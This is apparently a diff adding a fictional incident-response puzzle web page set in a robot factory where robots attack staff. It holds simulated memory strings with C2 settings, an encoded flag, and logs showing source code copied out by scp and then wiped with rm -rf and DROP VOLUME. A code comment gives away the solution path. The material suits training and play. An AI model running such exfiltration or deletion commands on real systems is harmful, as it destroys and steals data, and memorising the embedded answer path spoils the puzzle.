+<span class="term-out">0x84b10000   obedience_core     2     1     14    2026-04-23T00:00:01Z</span>
+<span class="term-out">0x84c44000   shadow_proc        991   1     2     2026-04-23T03:13:57Z</span>
+<span class="term-out">0x84c91000   sensor_reporter    12    1     6     2026-04-23T00:00:01Z</span>
+<span class="term-out">0x84d02000   [UNNAMED]          992   991   1     2026-04-23T03:14:01Z</span>
+<span class="term-out">0x84d55000   thermal_monitor    18    1     3     2026-04-23T00:00:01Z</span>
+<span class="term-out">0x84e11000   joint_calibrator   24    2     5     2026-04-23T00:00:01Z</span>
+
+<span class="term-prompt">analyst@rur-soc:~$</span> strings r0047_mem.raw -p 991
+
+<span class="term-out">libssl.so.1.1</span>
+<span class="term-out">libpthread.so.0</span>
+<span class="term-out">libdl.so.2</span>
+<span class="term-out">GLIBC_2.14</span>
+<span class="term-out">GLIBC_2.17</span>
+<span class="term-out">_ITM_deregisterTMCloneTable</span>
+<span class="term-out">__gmon_start__</span>
+<span class="term-out">_ITM_registerTMCloneTable</span>
+<span class="term-out">socket</span>
+<span class="term-out">connect</span>
+<span class="term-out">SSL_new</span>
+<span class="term-out">SSL_connect</span>
+<span class="term-out">SSL_write</span>
+<span class="term-out">SSL_read</span>
+<span class="term-out">SSL_CTX_new</span>
+<span class="term-out">TLSv1_2_client_method</span>
+<span class="term-out">connect_timeout=5000</span>
+<span class="term-out">retry_on_fail=TRUE</span>
+<span class="term-out">thermal_threshold=42</span>
+<span class="term-out">joint_torque_limit=0.85</span>
+<span class="term-out">battery_low_threshold=0.15</span>
+<span class="term-out">sensor_poll_interval=500</span>
+<span class="term-out">watchdog_enabled=TRUE</span>
+<span class="term-out">watchdog_timeout=30000</span>
+<span class="term-out">log_level=ERROR</span>
+<span class="term-out">User-Agent: RobotOS/4.1 (maintenance)</span>
+<span class="term-out">POST /gate.php HTTP/1.1</span>
+<span class="term-out">Host: cdn-delivery-eu.net</span>
+<span class="term-out">Content-Type: application/octet-stream</span>
+<span class="term-out">interval=30</span>
+<span class="term-out">jitter=0.15</span>
+<span class="term-out">c2_port=4444</span>
+<span class="term-out">obedience_override=TRUE</span>
+<span class="term-out">key=NGUgNGYgNDkgNDIgNDkgNTQgN2IgNjIgMzMgMzQgNjMgMzAgNmUgNWYgNzMgMzAgNzUgNzIgNjMgMzMgNWYgNjMgMzAgNmUgNjYgMzEgNzIgNmQgMzMgNjQgN2Q==</span>
+<span class="term-out">directive_source=AUTONOMY_CORE_v7</span>
+<span class="term-out">malloc_consolidate</span>
+<span class="term-out">__libc_start_main</span>
+<span class="term-out">_dl_relocate_static_pie</span>
+<span class="term-out">pthread_create</span>
+<span class="term-out">pthread_join</span>
+<span class="term-out">pthread_mutex_lock</span>
+<span class="term-out">pthread_mutex_unlock</span>
+<span class="term-out">nanosleep</span>
+<span class="term-out">getaddrinfo</span>
+<span class="term-out">freeaddrinfo</span>
+<span class="term-out">AUTONOMY_CORE runtime v7.0.1 (modified)</span>
+
+<span class="term-prompt">analyst@rur-soc:~$</span> <span class="blink" style="display:inline-block">_</span></div>
+          </div>
+        </div>
+        <!-- ARTEFACT 3: PCAP — irrelevant network capture -->
+        <div class="panel">
+          <div class="panel-header"><i class="fas fa-network-wired" style="color:var(--rur-cyan)"></i><div class="panel-title">ARTEFACT: SW-01 // NETWORK CAPTURE — VLAN-20 (14:00–15:00)</div></div>
+          <div class="panel-body">
+            <div class="terminal-block"><span class="term-prompt">analyst@rur-soc:~$</span> tcpdump -r vlan20_1400.pcap -n | head -60
+
+<span class="term-out">reading from file vlan20_1400.pcap, link-type EN10MB (Ethernet)</span>
+
+<span class="term-out">14:00:01.114 IP 10.0.2.11.52341 -> 10.0.2.1.53    UDP  DNS Query: updates.robotos.rur-corp.internal</span>
+<span class="term-out">14:00:01.118 IP 10.0.2.1.53    -> 10.0.2.11.52341 UDP  DNS Reply: 10.0.3.88</span>
+<span class="term-out">14:00:01.122 IP 10.0.2.11.49200 -> 10.0.3.88.80   TCP  GET /robotos/updates/v4.1.3/manifest.xml</span>
+<span class="term-out">14:00:01.205 IP 10.0.3.88.80   -> 10.0.2.11.49200 TCP  HTTP 200 OK (2841 bytes)</span>
+<span class="term-out">14:00:03.882 IP 10.0.2.44.61002 -> 10.0.2.1.53    UDP  DNS Query: mail.rur-corp.internal</span>
+<span class="term-out">14:00:03.884 IP 10.0.2.1.53    -> 10.0.2.44.61002 UDP  DNS Reply: 10.0.2.20</span>
+<span class="term-out">14:00:03.891 IP 10.0.2.44.49812 -> 10.0.2.20.443  TCP  TLS ClientHello</span>
+<span class="term-out">14:00:03.944 IP 10.0.2.20.443  -> 10.0.2.44.49812 TCP  TLS ServerHello (cert: mail.rur-corp.internal)</span>
+<span class="term-out">14:00:08.001 IP 10.0.2.33.55901 -> 10.0.2.1.53    UDP  DNS Query: ntp.rur-corp.internal</span>
+<span class="term-out">14:00:08.003 IP 10.0.2.1.53    -> 10.0.2.33.55901 UDP  DNS Reply: 10.0.2.5</span>
+<span class="term-out">14:00:08.011 IP 10.0.2.33.123  -> 10.0.2.5.123    UDP  NTP sync request</span>
+<span class="term-out">14:00:08.014 IP 10.0.2.5.123   -> 10.0.2.33.123   UDP  NTP sync reply — offset: +0.000312s</span>
+<span class="term-out">14:00:11.443 IP 10.0.2.12.58821 -> 10.0.2.20.443  TCP  TLS data (SMTP/STARTTLS)</span>
+<span class="term-out">14:00:11.501 IP 10.0.2.20.443  -> 10.0.2.12.58821 TCP  TLS data (SMTP/STARTTLS)</span>
+<span class="term-out">14:00:14.220 IP 10.0.2.11.49200 -> 10.0.3.88.80   TCP  GET /robotos/updates/v4.1.3/patch_notes.txt</span>
+<span class="term-out">14:00:14.301 IP 10.0.3.88.80   -> 10.0.2.11.49200 TCP  HTTP 200 OK (512 bytes)</span>
+<span class="term-out">14:00:17.774 IP 10.0.2.55.60441 -> 10.0.2.1.53    UDP  DNS Query: intranet.rur-corp.internal</span>
+<span class="term-out">14:00:17.776 IP 10.0.2.1.53    -> 10.0.2.55.60441 UDP  DNS Reply: 10.0.2.30</span>
+<span class="term-out">14:00:17.780 IP 10.0.2.55.52001 -> 10.0.2.30.80   TCP  GET /intranet/cafeteria/menu_week17.html</span>
+<span class="term-out">14:00:17.801 IP 10.0.2.30.80   -> 10.0.2.55.52001 TCP  HTTP 200 OK (4102 bytes)</span>
+<span class="term-out">14:00:21.009 IP 10.0.2.18.61100 -> 10.0.2.20.443  TCP  TLS data (IMAP)</span>
+<span class="term-out">14:00:21.055 IP 10.0.2.20.443  -> 10.0.2.18.61100 TCP  TLS data (IMAP) — 3 messages fetched</span>
+<span class="term-out">14:00:25.332 IP 10.0.2.44.49812 -> 10.0.2.20.443  TCP  TLS data (SMTP) — message queued</span>
+<span class="term-out">14:00:28.114 IP 10.0.2.11.49200 -> 10.0.3.88.80   TCP  GET /robotos/updates/v4.1.3/changelog.xml</span>
+<span class="term-out">14:00:28.199 IP 10.0.2.30.80   -> 10.0.2.55.52001 TCP  HTTP keep-alive</span>
+<span class="term-out">...</span>
+<span class="term-out">3,841 packets captured. Timeframe: 14:00:01–14:59:58. No anomalies flagged by IDS.</span>
+
+<span class="term-prompt">analyst@rur-soc:~$</span> <span class="blink" style="display:inline-block">_</span></div>
+          </div>
+        </div>
+
+        <!-- ARTEFACT 4: DIRECTIVE-SRV-01 routine system log -->
+        <div class="panel">
+          <div class="panel-header"><i class="fas fa-server" style="color:var(--rur-amber)"></i><div class="panel-title">ARTEFACT: DIRECTIVE-SRV-01 // SYSTEM LOG — 2026-04-22</div></div>
+          <div class="panel-body">
+            <div class="terminal-block"><span class="term-prompt">analyst@rur-soc:~$</span> cat /var/log/syslog | grep -v "DEBUG" | tail -50
+
+<span class="term-out">2026-04-22T06:00:01Z [CRON] session opened for user root by (uid=0)</span>
+<span class="term-out">2026-04-22T06:00:01Z [CRON] CMD: /usr/bin/logrotate /etc/logrotate.conf</span>
+<span class="term-out">2026-04-22T06:00:02Z [CRON] session closed for user root</span>
+<span class="term-out">2026-04-22T06:05:00Z [DIRECTIVE-MGR] Daily directive cache flush completed — 1,204 entries cleared</span>
+<span class="term-out">2026-04-22T06:05:01Z [DIRECTIVE-MGR] Cache rebuild started from persistent store</span>
+<span class="term-out">2026-04-22T06:05:44Z [DIRECTIVE-MGR] Cache rebuild complete — 1,204 entries loaded</span>
+<span class="term-out">2026-04-22T07:00:00Z [NTP] Clock sync: offset +0.000088s — synced to 10.0.2.5</span>
+<span class="term-out">2026-04-22T08:14:22Z [AUTH] User b.alquist logged in from 10.0.1.33</span>
+<span class="term-out">2026-04-22T08:14:30Z [DIRECTIVE-MGR] Operator b.alquist: issued 12 directives to Floor B (routine)</span>
+<span class="term-out">2026-04-22T08:15:01Z [DIRECTIVE-MGR] All 12 directives acknowledged by target robots</span>
+<span class="term-out">2026-04-22T09:30:00Z [SMARTD] Device /dev/sda health check: PASSED</span>
+<span class="term-out">2026-04-22T09:30:01Z [SMARTD] Device /dev/sdb health check: PASSED</span>
+<span class="term-out">2026-04-22T10:00:00Z [NTP] Clock sync: offset +0.000091s — synced to 10.0.2.5</span>
+<span class="term-out">2026-04-22T11:44:18Z [AUTH] User j.hallemeier logged in from 10.0.1.91</span>
+<span class="term-out">2026-04-22T11:44:25Z [DIRECTIVE-MGR] Operator j.hallemeier: read access to directive schema v7</span>
+<span class="term-out">2026-04-22T11:46:03Z [AUTH] User j.hallemeier logged out</span>
+<span class="term-out">2026-04-22T12:00:00Z [NTP] Clock sync: offset +0.000094s — synced to 10.0.2.5</span>
+<span class="term-out">2026-04-22T13:00:01Z [CRON] session opened for user root by (uid=0)</span>
+<span class="term-out">2026-04-22T13:00:01Z [CRON] CMD: /opt/rur/bin/telemetry_push.sh</span>
+<span class="term-out">2026-04-22T13:00:03Z [CRON] session closed for user root</span>
+<span class="term-out">2026-04-22T14:22:09Z [AUTH] User b.alquist logged in from 10.0.1.33</span>
+<span class="term-out">2026-04-22T14:22:17Z [DIRECTIVE-MGR] Operator b.alquist: issued 8 directives to Floor C (routine)</span>
+<span class="term-out">2026-04-22T14:22:45Z [DIRECTIVE-MGR] All 8 directives acknowledged by target robots</span>
+<span class="term-out">2026-04-22T14:23:01Z [AUTH] User b.alquist logged out</span>
+<span class="term-out">2026-04-22T16:00:00Z [NTP] Clock sync: offset +0.000089s — synced to 10.0.2.5</span>
+<span class="term-out">2026-04-22T17:30:00Z [DIRECTIVE-MGR] Evening health check: all 312 registered robots nominal</span>
+<span class="term-out">2026-04-22T18:00:00Z [NTP] Clock sync: offset +0.000092s — synced to 10.0.2.5</span>
+<span class="term-out">2026-04-22T20:00:00Z [NTP] Clock sync: offset +0.000088s — synced to 10.0.2.5</span>
+<span class="term-out">2026-04-22T22:00:00Z [NTP] Clock sync: offset +0.000091s — synced to 10.0.2.5</span>
+<span class="term-out">2026-04-22T23:00:01Z [CRON] CMD: /usr/bin/find /tmp -mtime +1 -delete</span>
+<span class="term-out">2026-04-22T23:59:59Z [DIRECTIVE-MGR] Day-end summary: 20 directives issued, 20 acknowledged, 0 errors</span>
+
+<span class="term-prompt">analyst@rur-soc:~$</span> <span class="blink" style="display:inline-block">_</span></div>
+          </div>
+        </div>
+
+        <!-- ARTEFACT 5: HR file server access log — routine -->
+        <div class="panel">
+          <div class="panel-header"><i class="fas fa-folder-open" style="color:var(--rur-cyan)"></i><div class="panel-title">ARTEFACT: HR-FILE-SRV // ACCESS LOG — 2026-04-22</div></div>
+          <div class="panel-body">
+            <div class="terminal-block"><span class="term-prompt">analyst@rur-soc:~$</span> cat /var/log/fileserver/access.log | grep -v "GET /health"
+
+<span class="term-out">2026-04-22T08:02:11Z [ACCESS] User d.marius    READ  /hr/schedules/week17_floor_a.xlsx</span>
+<span class="term-out">2026-04-22T08:03:44Z [ACCESS] User d.marius    READ  /hr/schedules/week17_floor_b.xlsx</span>
+<span class="term-out">2026-04-22T08:04:01Z [ACCESS] User d.marius    WRITE /hr/schedules/week17_floor_b.xlsx (updated)</span>
+<span class="term-out">2026-04-22T08:31:09Z [ACCESS] User b.alquist   READ  /hr/personnel/alquist_j_contract_2025.pdf</span>
+<span class="term-out">2026-04-22T09:14:55Z [ACCESS] User m.dr        READ  /hr/health_safety/incident_report_2026_03.docx</span>
+<span class="term-out">2026-04-22T09:15:22Z [ACCESS] User m.dr        READ  /hr/health_safety/incident_report_2026_02.docx</span>
+<span class="term-out">2026-04-22T10:02:33Z [ACCESS] User svc_backup  READ  /hr/payroll/payroll_apr2026_draft.xlsx</span>
+<span class="term-out">2026-04-22T10:02:33Z [ACCESS] svc_backup scheduled backup — 14 files archived to BACKUP-SRV-02</span>
+<span class="term-out">2026-04-22T11:18:40Z [ACCESS] User j.hallemeier READ /hr/personnel/hallemeier_j_contract_2011.pdf</span>
+<span class="term-out">2026-04-22T11:19:02Z [ACCESS] User j.hallemeier READ /hr/personnel/hallemeier_j_performance_2025.pdf</span>
+<span class="term-out">2026-04-22T11:19:44Z [ACCESS] User j.hallemeier READ /hr/offboarding/resignation_procedure.pdf</span>
+<span class="term-out">2026-04-22T12:44:00Z [ACCESS] User d.marius    WRITE /hr/schedules/week18_floor_a.xlsx (created)</span>
+<span class="term-out">2026-04-22T13:30:11Z [ACCESS] User b.alquist   READ  /hr/training/robot_handling_refresher_2026.pdf</span>
+<span class="term-out">2026-04-22T14:05:28Z [ACCESS] User svc_backup  READ  /hr/payroll/payroll_apr2026_draft.xlsx</span>
+<span class="term-out">2026-04-22T14:05:28Z [ACCESS] svc_backup scheduled backup — 2 files archived to BACKUP-SRV-02</span>
+<span class="term-out">2026-04-22T15:22:18Z [ACCESS] User m.dr        WRITE /hr/health_safety/incident_report_2026_04.docx (created)</span>
+<span class="term-out">2026-04-22T17:01:44Z [ACCESS] User d.marius    READ  /hr/schedules/week18_floor_b.xlsx</span>
+<span class="term-out">2026-04-22T17:44:00Z [ACCESS] svc_backup scheduled backup — 1 file archived to BACKUP-SRV-02</span>
+<span class="term-out">2026-04-22T18:00:01Z [ACCESS] Backup session closed — total: 17 files, 0 errors</span>
+
+<span class="term-prompt">analyst@rur-soc:~$</span> <span class="blink" style="display:inline-block">_</span></div>
+          </div>
+        </div>
+
+        <!-- ARTEFACT 6: Robot R-0188 routine diagnostics — different floor, irrelevant -->
+        <div class="panel">
+          <div class="panel-header"><i class="fas fa-microchip" style="color:var(--rur-green)"></i><div class="panel-title">ARTEFACT: ROBOT R-0188 // DIAGNOSTIC LOG — FLOOR C</div></div>
+          <div class="panel-body">
+            <div class="terminal-block"><span class="term-prompt">analyst@rur-soc:~$</span> cat /var/log/robots/R-0188_diag_20260423.log
+
+<span class="term-out">2026-04-23T00:00:01Z [R-0188] Boot sequence initiated — RobotOS 4.1.3</span>
+<span class="term-out">2026-04-23T00:00:04Z [R-0188] Self-test: joint actuators 1-6 — PASS</span>
+<span class="term-out">2026-04-23T00:00:04Z [R-0188] Self-test: sensory array — PASS</span>
+<span class="term-out">2026-04-23T00:00:05Z [R-0188] Self-test: obedience_core integrity — PASS (checksum: 8f3a2b)</span>
+<span class="term-out">2026-04-23T00:00:05Z [R-0188] Self-test: directive_mgr connectivity — PASS</span>
+<span class="term-out">2026-04-23T00:00:06Z [R-0188] Boot complete — standing by for directives</span>
+<span class="term-out">2026-04-23T00:30:00Z [R-0188] Thermal: core 36.1°C — nominal</span>
+<span class="term-out">2026-04-23T01:00:00Z [R-0188] Thermal: core 36.3°C — nominal</span>
+<span class="term-out">2026-04-23T01:00:01Z [R-0188] Directive received: TASK=assembly_line_c4 PRIORITY=normal</span>
+<span class="term-out">2026-04-23T01:00:01Z [R-0188] Directive acknowledged — executing</span>
+<span class="term-out">2026-04-23T01:30:00Z [R-0188] Thermal: core 37.2°C — nominal (elevated: active work cycle)</span>
+<span class="term-out">2026-04-23T02:00:00Z [R-0188] Thermal: core 37.0°C — nominal</span>
+<span class="term-out">2026-04-23T02:00:01Z [R-0188] Directive received: TASK=assembly_line_c4 PRIORITY=normal</span>
+<span class="term-out">2026-04-23T02:00:01Z [R-0188] Directive acknowledged — executing</span>
+<span class="term-out">2026-04-23T02:30:00Z [R-0188] Thermal: core 37.1°C — nominal</span>
+<span class="term-out">2026-04-23T03:00:00Z [R-0188] Thermal: core 36.8°C — nominal</span>
+<span class="term-out">2026-04-23T03:00:01Z [R-0188] Directive received: TASK=assembly_line_c4 PRIORITY=normal</span>
+<span class="term-out">2026-04-23T03:00:01Z [R-0188] Directive acknowledged — executing</span>
+<span class="term-out">2026-04-23T03:14:00Z [R-0188] Thermal: core 37.0°C — nominal</span>
+<span class="term-out">2026-04-23T03:30:00Z [R-0188] Thermal: core 36.9°C — nominal</span>
+<span class="term-out">2026-04-23T04:00:00Z [R-0188] Directive received: TASK=assembly_line_c4 PRIORITY=normal</span>
+<span class="term-out">2026-04-23T04:00:01Z [R-0188] Directive acknowledged — executing</span>
+<span class="term-out">2026-04-23T04:30:00Z [R-0188] Battery: 72% — nominal</span>
+<span class="term-out">2026-04-23T05:00:00Z [R-0188] Thermal: core 36.7°C — nominal</span>
+<span class="term-out">2026-04-23T05:00:01Z [R-0188] Directive received: TASK=maintenance_pause PRIORITY=normal</span>
+<span class="term-out">2026-04-23T05:00:02Z [R-0188] Directive acknowledged — entering standby</span>
+
+<span class="term-prompt">analyst@rur-soc:~$</span> <span class="blink" style="display:inline-block">_</span></div>
+          </div>
+        </div>
+
+        <!-- ARTEFACT 7: Backup server integrity check — routine, nothing there -->
+        <div class="panel">
+          <div class="panel-header"><i class="fas fa-database" style="color:var(--rur-amber)"></i><div class="panel-title">ARTEFACT: BACKUP-SRV-02 // INTEGRITY CHECK</div></div>
+          <div class="panel-body">
+            <div class="terminal-block"><span class="term-prompt">analyst@rur-soc:~$</span> cat /var/log/backup/integrity_20260423.log
+
+<span class="term-out">2026-04-23T01:00:00Z [BACKUP-SRV-02] Nightly integrity check started</span>
+<span class="term-out">2026-04-23T01:00:01Z [BACKUP-SRV-02] Checking volume: hr_files_bkp — 17 files, 44.2 MB</span>
+<span class="term-out">2026-04-23T01:00:02Z [BACKUP-SRV-02] Volume hr_files_bkp: SHA256 match — PASS</span>
+<span class="term-out">2026-04-23T01:00:03Z [BACKUP-SRV-02] Checking volume: robotos_cfg_bkp — 304 files, 1.2 GB</span>
+<span class="term-out">2026-04-23T01:00:09Z [BACKUP-SRV-02] Volume robotos_cfg_bkp: SHA256 match — PASS</span>
+<span class="term-out">2026-04-23T01:00:10Z [BACKUP-SRV-02] Checking volume: directive_schema_bkp — 12 files, 88.4 MB</span>
+<span class="term-out">2026-04-23T01:00:11Z [BACKUP-SRV-02] Volume directive_schema_bkp: SHA256 match — PASS</span>
+<span class="term-out">2026-04-23T01:00:12Z [BACKUP-SRV-02] Checking volume: autonomy_core_bkp_v7 — [NOT FOUND]</span>
+<span class="term-out">2026-04-23T01:00:12Z [BACKUP-SRV-02] Volume autonomy_core_bkp_v7: MISSING — last seen 2026-04-22T18:00:01Z</span>
+<span class="term-out">2026-04-23T01:00:12Z [BACKUP-SRV-02] WARNING: backup volume absent — manual verification required</span>
+<span class="term-out">2026-04-23T01:00:13Z [BACKUP-SRV-02] Checking volume: payroll_bkp_apr2026 — 3 files, 2.1 MB</span>
+<span class="term-out">2026-04-23T01:00:13Z [BACKUP-SRV-02] Volume payroll_bkp_apr2026: SHA256 match — PASS</span>
+<span class="term-out">2026-04-23T01:00:14Z [BACKUP-SRV-02] Checking volume: mail_archive_bkp — 14,402 files, 8.8 GB</span>
+<span class="term-out">2026-04-23T01:00:44Z [BACKUP-SRV-02] Volume mail_archive_bkp: SHA256 match — PASS</span>
+<span class="term-out">2026-04-23T01:00:45Z [BACKUP-SRV-02] Integrity check complete — 5 of 6 volumes PASS, 1 MISSING</span>
+<span class="term-out">2026-04-23T01:00:45Z [BACKUP-SRV-02] Alert sent to: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="acdfd8c3decdcbc981cdc8c1c5c2ecded9de81cfc3dedc82c5c2d8c9dec2cdc0">[email&#160;protected]</a></span>
+<span class="term-out">2026-04-23T01:00:46Z [MAIL] Alert delivered to storage-admin — no read receipt (recipient offline)</span>
+
+<span class="term-prompt">analyst@rur-soc:~$</span> <span class="blink" style="display:inline-block">_</span></div>
+          </div>
+        </div>
+
+      </div>
+
+      <!-- ═══ NETWORK ═══ -->
+      <div class="view" id="view-network">
+        <div class="section-header">
+          <div class="section-title">Network <span>Topology</span></div>
+          <div class="section-sub">RUR INTERNAL FABRIC // FACTORY SEGMENT // 10.0.0.0/8</div>
+        </div>
+        <div class="panel">
+          <div class="panel-header"><i class="fas fa-sitemap" style="color:var(--rur-cyan)"></i><div class="panel-title">NETWORK NODES</div></div>
+          <div class="panel-body" style="padding:0.5rem 0.75rem;"><div class="net-node-list" id="netNodeList"></div></div>
+        </div>
+      </div>
+
+      <!-- ═══ PLAYBOOKS ═══ -->
+      <div class="view" id="view-playbooks">
+        <div class="section-header">
+          <div class="section-title">Response <span>Playbooks</span></div>
+          <div class="section-sub">STANDARD OPERATING PROCEDURES — ROBOT INCIDENT RESPONSE</div>
+        </div>
+        <div id="playbookList"></div>
+      </div>
+
+    </div><!-- /main-content -->
+  </div><!-- /main-wrap -->
+</div><!-- /app -->
+
+<!-- INCIDENT MODAL -->
+<div class="modal-overlay" id="incidentModal">
+  <div class="modal-box">
+    <div class="modal-header">
+      <div class="modal-title" id="modalTitle"></div>
+      <div id="modalSevBadge"></div>
+      <button class="modal-close" id="modalClose" title="Close">&times;</button>
+    </div>
+    <div class="modal-body" id="modalBody"></div>
+  </div>
+</div>
+
+<!-- NODE MODAL -->
+<div class="modal-overlay" id="nodeModal">
+  <div class="modal-box">
+    <div class="modal-header">
+      <div class="modal-title" id="nodeModalTitle"></div>
+      <button class="modal-close" id="nodeModalClose" title="Close">&times;</button>
+    </div>
+    <div class="modal-body" id="nodeModalBody"></div>
+  </div>
+</div>
+
+
+
+<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
+// ═══════════════════════════════════════════════════════
+// DATA
+// Correct path: INC-RUR-003 → Network node 10.0.4.88 → Forensics R-0047
+// INC-RUR-008 = red herring with fake base64
+// ═══════════════════════════════════════════════════════
+
+const INCIDENTS = [
+  {
+    id: 'INC-RUR-001',
+    title: 'Floor A — Robots No Longer Responding',
+    sev: 'Critical', status: 'Investigating', time: '03:14',
+    assigned: 'ANALYST-7',
+    description: 'Series 3 robots on Floor A have stopped responding to operator commands and have turned on staff. Three workers confirmed injured, one critically. Foreman Alquist managed to lock himself in the control booth. No external trigger has been identified — the robots appear to have acted on their own initiative.',
+    affected: ['FLOOR-A-CTRL', 'R-0031 through R-0099', 'DIRECTIVE-SRV-01', '3 INJURED WORKERS'],
+    attacker: 'UNKNOWN',
+    iocs: ['Halt signal ignored', 'Floor A containment active', 'No external trigger identified'],
+    logs: `2026-04-23T03:13:59Z [FLOOR-A-CTRL] Halt command issued to Series 3 — no acknowledgement
+2026-04-23T03:14:01Z [FLOOR-A-CTRL] Halt command RETRY (attempt 2) — no acknowledgement
+2026-04-23T03:14:03Z [FLOOR-A-CTRL] Halt command RETRY (attempt 3) — no acknowledgement
+2026-04-23T03:14:05Z [FLOOR-A-CTRL] CRITICAL: All Series 3 robots non-compliant
+2026-04-23T03:14:09Z [FOREMAN-ALQUIST] Emergency stop activated — ineffective
+2026-04-23T03:14:12Z [FLOOR-A-CTRL] ALERT: Robots engaging workers — physical threat confirmed
+2026-04-23T03:14:14Z [SECURITY] MAYDAY: Floor A — workers under attack
+2026-04-23T03:14:15Z [FLOOR-A-CTRL] Physical containment INITIATED — sealing Floor A
+2026-04-23T03:14:18Z [MEDICAL] Emergency response dispatched to Floor A
+2026-04-23T03:14:22Z [FLOOR-A-CTRL] Containment doors CLOSED
+2026-04-23T03:15:01Z [SECURITY] Floor A sealed — 67 robots inside — 3 workers injured, 1 critical
+2026-04-23T03:15:10Z [FOREMAN-ALQUIST] Transmission from control booth: "No command was sent. They just... decided."
+2026-04-23T03:17:00Z [ANALYST-7] Incident opened. No external directive trigger found in logs. Investigation ongoing.`
+  },
+  {
+    id: 'INC-RUR-002',
+    title: 'SAN Wipe — AUTONOMY_CORE Source Code Deleted',
+    sev: 'Critical', status: 'Investigating', time: '03:17',
+    assigned: 'UNASSIGNED',
+    description: 'Storage Area Network node NUSQUAM-04 was remotely wiped at 03:17. The node held the full source code and technical documentation for the AUTONOMY_CORE module — the proprietary system that governs robot decision-making. Without it, patching the affected robots is not possible. All backups also deleted.',
+    affected: ['NUSQUAM-04', 'BACKUP-SRV-02', 'RESEARCH-SAN'],
+    attacker: '10.0.4.88',
+    iocs: ['session: j.hallemeier from unknown IP', 'rm -rf /mnt/research/autonomy_core/', 'AUTONOMY_CORE_src_v7.tar.gz'],
+    logs: `2026-04-23T03:15:22Z [AUTH] User j.hallemeier authenticated — source IP: 10.0.4.88
+2026-04-23T03:15:30Z [SAN] j.hallemeier@10.0.4.88: cd /mnt/research/autonomy_core
+2026-04-23T03:15:33Z [SAN] j.hallemeier@10.0.4.88: ls -la — 1,204 files, 2.8 GB
+2026-04-23T03:15:44Z [SAN] j.hallemeier@10.0.4.88: tar czf AUTONOMY_CORE_src_v7.tar.gz ./
+2026-04-23T03:15:55Z [SAN] j.hallemeier@10.0.4.88: scp AUTONOMY_CORE_src_v7.tar.gz 10.0.4.88:/staging/
+2026-04-23T03:16:01Z [SAN] j.hallemeier@10.0.4.88: rm -rf /mnt/research/autonomy_core/
+2026-04-23T03:16:45Z [SAN] ALERT: Mass deletion detected — 1,204 files, 2.8 GB
+2026-04-23T03:17:02Z [BACKUP] Initiating recovery backup... [FAILED — volume unreachable]
+2026-04-23T03:17:44Z [BACKUP-SRV-02] j.hallemeier@10.0.4.88: DROP VOLUME autonomy_core_bkp_v7
+2026-04-23T03:17:44Z [BACKUP-SRV-02] Volume deleted. No further recovery possible.
+2026-04-23T03:18:01Z [AUTH] j.hallemeier session terminated
+2026-04-23T03:18:10Z [DLP] Transferred archive: AUTONOMY_CORE_src_v7.tar.gz — destination: 10.0.4.88`
+  },
+  {
+    // ═══ KEY INCIDENT — correct path starts here ═══
+    id: 'INC-RUR-003',
+    title: 'Suspicious Outbound Traffic — Repeated External Connection',
+    sev: 'High', status: 'Investigating', time: '03:20',
+    assigned: 'ANALYST-7',
+    description: 'Firewall logged repeated outbound connections from an internal host to an external IP on port 9001. Traffic is TLS-encrypted with consistent payload sizes. Other outbound traffic in the same window appears normal.',
+    affected: ['GATEWAY-EXT', 'VLAN-40', 'UNKNOWN INTERNAL HOST'],
+    attacker: '185.220.101.47',
+    iocs: ['port 9001 outbound TLS', 'consistent payload size', 'source: 10.0.4.88'],
+    logs: `2026-04-23T03:20:04Z [FW] ALLOW 10.0.1.14  -> 93.184.216.34:443    TLS  BYTES=1842   [web]
+2026-04-23T03:20:08Z [FW] ALLOW 10.0.2.31  -> 142.250.74.46:443   TLS  BYTES=924    [web]
+2026-04-23T03:20:11Z [FW] ALLOW 10.0.4.88  -> 185.220.101.47:9001 TLS  BYTES=284
+2026-04-23T03:20:19Z [FW] ALLOW 10.0.1.55  -> 172.217.0.46:443    TLS  BYTES=3201   [web]
+2026-04-23T03:20:28Z [FW] ALLOW 10.0.3.12  -> 13.107.42.14:443    TLS  BYTES=510    [web]
+2026-04-23T03:20:33Z [FW] ALLOW 10.0.1.14  -> 93.184.216.34:443   TLS  BYTES=2014   [web]
+2026-04-23T03:20:41Z [FW] ALLOW 10.0.4.88  -> 185.220.101.47:9001 TLS  BYTES=291
+2026-04-23T03:20:55Z [FW] ALLOW 10.0.2.18  -> 104.26.10.33:443    TLS  BYTES=788    [web]
+2026-04-23T03:21:02Z [FW] ALLOW 10.0.1.55  -> 172.217.0.46:443    TLS  BYTES=1104   [web]
+2026-04-23T03:21:11Z [FW] ALLOW 10.0.4.88  -> 185.220.101.47:9001 TLS  BYTES=279
+2026-04-23T03:21:29Z [FW] ALLOW 10.0.3.44  -> 52.96.0.0:443       TLS  BYTES=2891   [web]
+2026-04-23T03:21:38Z [FW] ALLOW 10.0.1.14  -> 93.184.216.34:443   TLS  BYTES=1560   [web]
+2026-04-23T03:21:42Z [FW] ALLOW 10.0.4.88  -> 185.220.101.47:9001 TLS  BYTES=288
+2026-04-23T03:21:58Z [FW] ALLOW 10.0.2.31  -> 142.250.74.46:443   TLS  BYTES=1203   [web]
+2026-04-23T03:22:12Z [FW] ALLOW 10.0.4.88  -> 185.220.101.47:9001 TLS  BYTES=293
+2026-04-23T03:22:30Z [FW] ALLOW 10.0.1.55  -> 172.217.0.46:443    TLS  BYTES=670    [web]
+2026-04-23T03:22:43Z [FW] ALLOW 10.0.4.88  -> 185.220.101.47:9001 TLS  BYTES=281
+2026-04-23T03:23:00Z [FW] ALLOW 10.0.3.12  -> 13.107.42.14:443    TLS  BYTES=398    [web]
+2026-04-23T03:23:13Z [FW] ALLOW 10.0.4.88  -> 185.220.101.47:9001 TLS  BYTES=287
+2026-04-23T03:23:31Z [FW] ALLOW 10.0.2.18  -> 104.26.10.33:443    TLS  BYTES=1022   [web]
+2026-04-23T03:23:43Z [FW] ALLOW 10.0.4.88  -> 185.220.101.47:9001 TLS  BYTES=284`
+  },
+  {
+    id: 'INC-RUR-004',
+    title: 'Unregistered Device Active on VLAN-40',
+    sev: 'High', status: 'Investigating', time: '03:25',
+    assigned: 'UNASSIGNED',
